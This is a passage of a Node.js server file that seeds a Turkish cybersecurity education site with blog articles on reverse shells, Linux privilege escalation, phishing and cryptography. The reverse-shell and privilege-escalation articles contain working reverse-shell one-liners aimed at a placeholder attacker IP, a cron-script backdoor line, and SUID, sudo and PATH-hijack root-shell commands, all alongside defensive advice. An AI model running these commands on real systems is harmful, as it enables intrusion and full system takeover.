          meta_description: 'Reverse shell nedir, nasıl çalışır? Netcat, Bash, Python ve PHP reverse shell örnekleri. Tespit ve savunma stratejileri.',
          focus_keywords: 'reverse shell nedir, reverse shell örnekleri, netcat reverse shell, reverse shell tespit, post exploitation',
          content: '<h2>Reverse Shell Nedir?</h2><p><strong>Reverse shell</strong>, hedef sistemin saldırganın makinesine geri bağlantı kurduğu bir uzaktan erişim tekniğidir. Normal bir shell bağlantısında (bind shell) saldırgan hedefe bağlanırken, reverse shell\'de hedef saldırgana bağlanır. Bu yaklaşım güvenlik duvarlarını atlamak için kritik öneme sahiptir.</p><h2>Neden Reverse Shell Kullanılır?</h2><ul><li><strong>Güvenlik duvarı bypass:</strong> Çoğu firewall gelen bağlantıları engeller ama giden bağlantılara izin verir</li><li><strong>NAT arkasındaki hedefler:</strong> Özel IP\'li sistemlere doğrudan erişim mümkün olmadığında</li><li><strong>Post-exploitation:</strong> İlk erişim sağlandıktan sonra kalıcı bağlantı kurmak için</li></ul><h2>Reverse Shell Nasıl Çalışır?</h2><p>İki aşamadan oluşur:</p><ol><li><strong>Dinleyici (Listener):</strong> Saldırgan kendi makinesinde belirli bir portu dinlemeye alır</li><li><strong>Payload:</strong> Hedef sistemde çalışan kod, saldırganın IP\'sine geri bağlantı kurar</li></ol><h2>Popüler Reverse Shell Örnekleri</h2><h3>1. Netcat Reverse Shell</h3><pre><code># Saldırgan tarafı (listener)\nnc -lvnp 4444\n\n# Hedef tarafı\nnc -e /bin/bash SALDIRGAN_IP 4444</code></pre><h3>2. Bash Reverse Shell</h3><pre><code>bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1</code></pre><h3>3. Python Reverse Shell</h3><pre><code>python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("SALDIRGAN_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'</code></pre><h3>4. PHP Reverse Shell</h3><pre><code>&lt;?php exec("/bin/bash -c \'bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1\'"); ?&gt;</code></pre><h3>5. PowerShell Reverse Shell (Windows)</h3><pre><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'SALDIRGAN_IP\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'&gt; \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre><h2>Shell Yükseltme (Shell Upgrade)</h2><p>Temel reverse shell\'ler sınırlıdır. Tam interaktif TTY shell için:</p><pre><code># Python ile TTY spawn\npython3 -c \'import pty; pty.spawn("/bin/bash")\'\n\n# Ctrl+Z ile arka plana al, ardından:\nstty raw -echo; fg\nexport TERM=xterm</code></pre><h2>Tespit ve Savunma</h2><h3>Tespit Yöntemleri</h3><ul><li><strong>Network monitoring:</strong> Olağandışı giden bağlantıları izleyin</li><li><strong>Process monitoring:</strong> <code>/bin/bash</code> veya <code>cmd.exe</code>\'nin ağ soketi açmasını takip edin</li><li><strong>EDR çözümleri:</strong> CrowdStrike, SentinelOne gibi araçlar reverse shell aktivitesini algılar</li></ul><h3>Savunma Stratejileri</h3><ul><li>Giden bağlantıları güvenlik duvarında sınırlayın (egress filtering)</li><li>Gereksiz yorumlayıcıları (Python, Perl, nc) sistemden kaldırın</li><li>Uygulama whitelisting uygulayın</li><li>Ağ segmentasyonu yapın</li></ul><h2>Sonuç</h2><p>Reverse shell, sızma testlerinin vazgeçilmez bir aracıdır. Güvenlik uzmanları bu teknikleri hem saldırı hem de savunma perspektifinden anlamalıdır.</p><blockquote>siberkampus Sistem Sömürüsü laboratuvarlarında reverse shell tekniklerini güvenli ortamda uygulayın.</blockquote>'
        },
        {
          title: 'Linux Ayrıcalık Yükseltme Rehberi: Temelden İleri Seviyeye',
          slug: 'linux-ayricalik-yukseltme-rehberi',
          excerpt: 'Linux sistemlerde ayrıcalık yükseltme (privilege escalation) tekniklerini adım adım öğrenin: SUID sömürüsü, sudo bypass, cron görevleri ve kernel açıkları.',
          category: 'Sistem Güvenliği',
          author: 'Can Demir',
          read_time: '20 dk',
          seo_title: 'Linux Ayrıcalık Yükseltme (Privilege Escalation) Rehberi | siberkampus',
          meta_description: 'Linux sistemlerde SUID, sudo yetkileri, cron görevleri ve kernel açıklarıyla yetki yükseltme (root olma) tekniklerini uygulamalı örneklerle öğrenin.',
          focus_keywords: 'linux ayrıcalık yükseltme, linux privilege escalation, suid sömürüsü, root olma, linux yetki yükseltme',
          content: '<h2>Linux Ayrıcalık Yükseltme (Privilege Escalation) Nedir?</h2><p><strong>Privilege Escalation (Ayrıcalık Yükseltme)</strong>, düşük yetkili bir kullanıcı hesabından daha yüksek yetkilere — genellikle <code>root</code> erişimine — geçiş sürecidir. Sızma testlerinin en kritik aşamalarından biridir.</p><h2>Temel Keşif Komutları</h2><p>Yetki yükseltme öncesi sistem hakkında bilgi toplamak gerekir:</p><pre><code># Kullanıcı bilgisi\nwhoami && id\n\n# İşletim sistemi bilgisi\nuname -a && cat /etc/os-release\n\n# SUID dosyaları\nfind / -perm -4000 -type f 2>/dev/null\n\n# Yazılabilir dosyalar\nfind / -writable -type f 2>/dev/null\n\n# Cron görevleri\ncat /etc/crontab && ls -la /etc/cron.*\n\n# Sudo yetkileri\nsudo -l</code></pre><h2>Ayrıcalık Yükseltme Teknikleri</h2><h3>1. SUID Bit Sömürüsü</h3><p>SUID (Set User ID) bit ayarlı dosyalar, çalıştırıldığında dosya sahibinin yetkileriyle çalışır. Root\'a ait SUID dosyası bulunursa root komutu çalıştırılabilir:</p><pre><code># SUID dosyalarını bul\nfind / -perm -u=s -type f 2>/dev/null\n\n# Örnek: /usr/bin/find SUID ise\nfind . -exec /bin/bash -p \\; -quit</code></pre><p><strong>GTFOBins</strong> sitesinden hangi SUID binary\'lerinin sömürülebileceğini kontrol edin.</p><h3>2. Sudo Yanlış Yapılandırması</h3><p><code>sudo -l</code> komunun çıktısı kritik bilgiler verir:</p><pre><code># Eğer şu çıktıyı alırsanız:\n(ALL) NOPASSWD: /usr/bin/vim\n\n# Root shell almak için:\nsudo vim -c \'!bash\'</code></pre><h3>3. Cron Job Sömürüsü</h3><p>Root tarafından çalıştırılan cron görevlerinin scriptleri düzenlenebilirse:</p><pre><code># Root cron\'u kontrol et\ncat /etc/crontab\n\n# Eğer /opt/backup.sh root tarafından çalışıyorsa ve yazılabilirse:\necho \'bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1\' >> /opt/backup.sh</code></pre><h3>4. Kernel Exploit</h3><p>Eski kernel sürümleri bilinen güvenlik açıklarına sahip olabilir:</p><table><tr><th>CVE</th><th>İsim</th><th>Etkilenen Kernel</th></tr><tr><td>CVE-2016-5195</td><td>Dirty COW</td><td>2.x - 4.x</td></tr><tr><td>CVE-2021-4034</td><td>PwnKit</td><td>Tüm polkit sürümleri</td></tr><tr><td>CVE-2022-0847</td><td>Dirty Pipe</td><td>5.8 - 5.16</td></tr></table><h3>5. PATH Hijacking</h3><p>SUID programı tam yol belirtmeden komut çağırıyorsa PATH değişkeni manipüle edilebilir:</p><pre><code>echo \'/bin/bash\' > /tmp/ps\nchmod +x /tmp/ps\nexport PATH=/tmp:$PATH\n# SUID programını çalıştır</code></pre><h2>Otomatik Araçlar</h2><ul><li><strong>LinPEAS:</strong> En kapsamlı Linux enumeration scripti</li><li><strong>LinEnum:</strong> Hızlı sistem keşif aracı</li><li><strong>linux-exploit-suggester:</strong> Kernel exploit önerici</li></ul><pre><code># LinPEAS kullanımı\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</code></pre><h2>Savunma Önerileri</h2><ul><li>Gereksiz SUID bitlerini kaldırın</li><li>Sudo yetkilerini minimum tutun</li><li>Kernel\'i güncel tutun</li><li>Cron scriptlerinin izinlerini sıkılaştırın</li><li>Dosya bütünlüğü izleme (AIDE, Tripwire) kullanın</li></ul><h2>Sonuç</h2><p>Linux ayrıcalık yükseltme, sızma testçileri için temel bir beceridir. Sistematik bir keşif süreci ve doğru tekniklerle düşük yetkili erişimden tam kontrol elde edilebilir.</p><blockquote>siberkampus Sistem Sömürüsü laboratuvarlarında bu teknikleri uygulamalı olarak deneyimleyin.</blockquote>'
        },
        {
          title: 'Phishing Saldırıları: Sosyal Mühendislik Tekniklerini Tanıma ve Savunma',
          slug: 'phishing-saldirilari-sosyal-muhendislik-savunma',
          excerpt: 'Phishing saldırı türlerini, gerçek dünya örneklerini, saldırı anatomisini ve kurumsal/bireysel savunma stratejilerini detaylı öğrenin.',
          category: 'Sosyal Mühendislik',
          author: 'Fatih Eren',
          read_time: '14 dk',
          seo_title: 'Phishing Nedir? Sosyal Mühendislik Saldırı Türleri ve Korunma Yolları',
          meta_description: 'Phishing saldırı türlerini (spear phishing, whaling, vishing, smishing), gerçek örneklerini ve etkili savunma yöntemlerini öğrenin.',
          focus_keywords: 'phishing nedir, sosyal mühendislik, oltalama saldırısı, phishing korunma, spear phishing',
          content: '<h2>Phishing (Oltalama) Saldırısı Nedir?</h2><p><strong>Phishing</strong>, saldırganların güvenilir bir kurum veya kişi gibi davranarak kurbanlardan hassas bilgiler (şifre, kredi kartı, kişisel veri) elde etmeye çalıştığı sosyal mühendislik tekniğidir. Siber saldırıların %90\'ından fazlası phishing ile başlar.</p><h2>Phishing Türleri</h2><h3>1. Email Phishing</h3><p>En yaygın türdür. Binlerce kişiye toplu sahte e-posta gönderilir:</p><ul><li>Banka hesap güncelleme bildirimleri</li><li>Kargo takip linkleri</li><li>Şifre sıfırlama talepleri</li></ul><h3>2. Spear Phishing</h3><p>Belirli bir kişi veya kurumu hedef alan kişiselleştirilmiş saldırılardır. LinkedIn, sosyal medya bilgileri kullanılarak ikna edici mesajlar hazırlanır.</p><h3>3. Whaling</h3><p>CEO, CFO gibi üst düzey yöneticileri hedef alır. Genellikle finansal işlemler veya gizli belgelere erişim için kullanılır.</p><h3>4. Vishing (Voice Phishing)</h3><p>Telefon aramasıyla yapılan oltalama. Banka müşteri hizmetleri veya teknik destek taklidi yapılır.</p><h3>5. Smishing (SMS Phishing)</h3><p>SMS üzerinden zararlı linkler gönderilir. Kargo bildirimi veya banka uyarısı gibi mesajlar kullanılır.</p><h2>Phishing Saldırısının Anatomisi</h2><ol><li><strong>Keşif:</strong> Hedef hakkında bilgi toplama (OSINT)</li><li><strong>Hazırlık:</strong> Sahte domain, giriş sayfası ve e-posta şablonu oluşturma</li><li><strong>Gönderim:</strong> İkna edici mesajla saldırıyı başlatma</li><li><strong>Toplama:</strong> Kurbanın girdiği bilgileri kaydetme</li><li><strong>Sömürü:</strong> Elde edilen bilgilerle sisteme erişim</li></ol><h2>Phishing Nasıl Tespit Edilir?</h2><ul><li><strong>Gönderici adresi:</strong> <code>destek@bankasi-guvenlik.com</code> gibi typosquatting kontrolü</li><li><strong>URL kontrolü:</strong> Linkin üzerine gelip gerçek adresi kontrol edin</li><li><strong>Aciliyet dili:</strong> "Hesabınız 24 saat içinde kapatılacak" gibi baskı ifadeleri</li><li><strong>Yazım hataları:</strong> Profesyonel kurumlardan gelmeyen dilbilgisi hataları</li><li><strong>Beklenmedik ekler:</strong> .exe, .scr, .js uzantılı dosyalara dikkat</li></ul><h2>Savunma Stratejileri</h2><h3>Bireysel</h3><ul><li>E-postalardaki linklere tıklamadan önce URL\'yi kontrol edin</li><li>İki faktörlü kimlik doğrulama (2FA) kullanın</li><li>Şifre yöneticisi kullanarak her site için farklı şifre oluşturun</li></ul><h3>Kurumsal</h3><ul><li><strong>SPF, DKIM, DMARC:</strong> E-posta doğrulama protokollerini yapılandırın</li><li><strong>Güvenlik farkındalık eğitimi:</strong> Düzenli phishing simülasyonları yapın</li><li><strong>E-posta filtreleme:</strong> Spam gateway ve sandbox çözümleri kullanın</li><li><strong>Zero Trust:</strong> Her erişim talebini doğrulayın</li></ul><h2>Sonuç</h2><p>Phishing saldırıları teknolojiden çok insan faktörünü hedefler. Teknik önlemler ve güvenlik farkındalığı bir arada uygulandığında etkili bir savunma oluşturulabilir.</p><blockquote>siberkampus platformunda sosyal mühendislik senaryolarını interaktif ortamda deneyimleyin.</blockquote>'
        },
        {
          title: 'Kriptografi Temelleri: Şifreleme, Hash ve Dijital İmza Rehberi',
          slug: 'kriptografi-temelleri-sifreleme-hash-dijital-imza',
          excerpt: 'Simetrik/asimetrik şifreleme, hash fonksiyonları, dijital imzalar ve SSL/TLS protokolünü temellerinden ileri seviyeye kadar öğrenin.',
          category: 'Kriptografi',
          author: 'Murat Sönmez',
          read_time: '17 dk',
          seo_title: 'Kriptografi Nedir? Şifreleme Türleri, Hash ve SSL/TLS Rehberi | 2025',
          meta_description: 'Kriptografi temelleri: AES, RSA şifreleme, SHA hash fonksiyonları, dijital imzalar ve SSL/TLS protokolü. Siber güvenlikte kriptografinin rolü.',
          focus_keywords: 'kriptografi nedir, şifreleme türleri, aes rsa farkı, hash fonksiyonu, ssl tls nasıl çalışır',
          content: '<h2>Kriptografi Nedir?</h2><p><strong>Kriptografi</strong>, bilgiyi yetkisiz erişimden korumak için matematiksel algoritmalar kullanan bilim dalıdır. Siber güvenliğin temel taşı olan kriptografi; gizlilik, bütünlük, kimlik doğrulama ve inkar edilemezlik sağlar.</p><h2>Şifreleme Türleri</h2><h3>1. Simetrik Şifreleme</h3><p>Şifreleme ve çözme için <strong>aynı anahtar</strong> kullanılır. Hızlıdır ancak anahtar paylaşımı sorun oluşturur.</p><table><tr><th>Algoritma</th><th>Anahtar Boyutu</th><th>Kullanım</th></tr><tr><td>AES</td><td>128/192/256 bit</td><td>Modern standart, en yaygın</td></tr><tr><td>ChaCha20</td><td>256 bit</td><td>Mobil cihazlar, TLS</td></tr><tr><td>3DES</td><td>168 bit</td><td>Eski sistemler (önerilmez)</td></tr></table><pre><code># Python ile AES şifreleme\nfrom Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_GCM)\nciphertext, tag = cipher.encrypt_and_digest(plaintext)</code></pre><h3>2. Asimetrik Şifreleme</h3><p>İki farklı anahtar kullanılır: <strong>açık anahtar</strong> (şifreleme) ve <strong>özel anahtar</strong> (çözme). Anahtar paylaşım sorununu çözer.</p><table><tr><th>Algoritma</th><th>Güvenlik Temeli</th><th>Kullanım</th></tr><tr><td>RSA</td><td>Büyük asal çarpanlarına ayırma</td><td>Dijital imza, TLS</td></tr><tr><td>ECC</td><td>Eliptik eğri matematik</td><td>Mobil, IoT</td></tr><tr><td>Ed25519</td><td>Edwards eğrisi</td><td>SSH, modern protokoller</td></tr></table><h2>Hash Fonksiyonları</h2><p>Herhangi bir boyuttaki veriyi sabit boyutlu özete dönüştüren tek yönlü fonksiyonlardır. Şifre saklama ve veri bütünlüğü kontrolü için kullanılır.</p><ul><li><strong>SHA-256:</strong> Günümüz standardı, Bitcoin\'de kullanılır</li><li><strong>bcrypt/Argon2:</strong> Şifre hash\'leme için özel tasarlanmış</li><li><strong>MD5/SHA-1:</strong> Kırılmıştır, kullanmayın!</li></ul><pre><code># SHA-256 hash örneği\necho -n "siberkampus" | sha256sum\n# Çıktı: 64 karakter hex değer</code></pre><h2>Dijital İmzalar</h2><p>Asimetrik kriptografinin tersi şekilde çalışır: özel anahtarla imzalama, açık anahtarla doğrulama. Belgenin kimden geldiğini ve değiştirilmediğini kanıtlar.</p><h2>SSL/TLS Nasıl Çalışır?</h2><p>HTTPS bağlantısının temeli olan TLS handshake süreci:</p><ol><li><strong>Client Hello:</strong> Tarayıcı desteklediği şifreleme yöntemlerini gönderir</li><li><strong>Server Hello:</strong> Sunucu sertifikasını ve seçilen algoritmayı gönderir</li><li><strong>Anahtar değişimi:</strong> Simetrik oturum anahtarı güvenli şekilde oluşturulur</li><li><strong>Şifreli iletişim:</strong> Tüm veri simetrik anahtarla şifrelenir</li></ol><h2>Kriptografik Saldırılar</h2><ul><li><strong>Brute Force:</strong> Tüm olası anahtarları deneme</li><li><strong>Rainbow Table:</strong> Önceden hesaplanmış hash tabloları (salt ile önlenir)</li><li><strong>Birthday Attack:</strong> Hash çakışması bulma</li><li><strong>Side-Channel:</strong> Zamanlama, güç tüketimi analizi</li></ul><h2>Sonuç</h2><p>Kriptografi, modern dijital güvenliğin temel yapı taşıdır. Doğru algoritma seçimi, güvenli anahtar yönetimi ve güncel protokollerin kullanımı güvenli iletişimin temelini oluşturur.</p><blockquote>siberkampus platformunda kriptografi araçlarını kullanarak şifreleme ve hash tekniklerini uygulamalı öğrenin.</blockquote>'
        }
      ];

      for (const blog of defaultBlogs) {
        await pool.query(
          `INSERT INTO blogs (title, slug, excerpt, content, category, author, read_time, seo_title, meta_description, focus_keywords)
           VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
           ON CONFLICT (slug) DO UPDATE SET
             title = EXCLUDED.title,
             excerpt = EXCLUDED.excerpt,
             content = EXCLUDED.content,
             category = EXCLUDED.category,
             author = EXCLUDED.author,
             read_time = EXCLUDED.read_time,
             seo_title = EXCLUDED.seo_title,
             meta_description = EXCLUDED.meta_description,
             focus_keywords = EXCLUDED.focus_keywords`,
          [blog.title, blog.slug, blog.excerpt, blog.content, blog.category, blog.author, blog.read_time, blog.seo_title, blog.meta_description, blog.focus_keywords]
        );
      }
      console.log('✓ Blog yazıları güncellendi.');

      // Delete any blogs that are not in our default list (short/deprecated legacy blogs)
      const allowedSlugs = defaultBlogs.map(b => b.slug);
      await pool.query(
        'DELETE FROM blogs WHERE NOT (slug = ANY($1::text[]))',
        [allowedSlugs]
      );
      console.log('✓ Eski/kısa blog yazıları temizlendi.');
    }
  } catch (err) {
    console.error('Veritabanı başlatma hatası:', err);
  }
}

// Always initialize database on startup (works in serverless environment too)
initDatabase().catch(err => console.error('Veritabanı başlatma hatası:', err));

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`\n🚀 Express yerel sunucu basariyla baslatildi!`);
    console.log(`   Siber Kampus sitesine erismek icin tiklayin:`);
    console.log(`   👉 http://localhost:${PORT}/index.html (Dinamik React Sürümü)`);
    console.log(`   👉 http://localhost:${PORT}/siberkampus%20Anasayfa.html (Statik Landing Page)\n`);
    console.log(`Kapatmak için terminalde Ctrl+C tuşlarına basın.\n`);
  });
}

module.exports = app;
